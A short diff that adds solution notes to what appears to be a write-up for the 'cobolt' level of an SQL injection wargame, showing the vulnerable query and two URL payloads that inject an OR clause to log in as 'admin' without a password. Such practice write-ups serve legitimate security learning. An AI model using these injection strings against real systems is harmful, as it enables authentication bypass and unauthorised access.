@@ -18,3 +18,6 @@ query : select id from prob_cobolt where id='' and pw=md5('')
 
 the SQL_INJECTION will be in the url
 
+https://los.rubiya.kr/chall/cobolt_{link}.php?id='+or+id='admin%'+and'1'='1'--
+
+https://los.rubiya.kr/chall/cobolt_{link}.php?id=a%27+or+id=%27admin%27+and%271%27=%271%27--
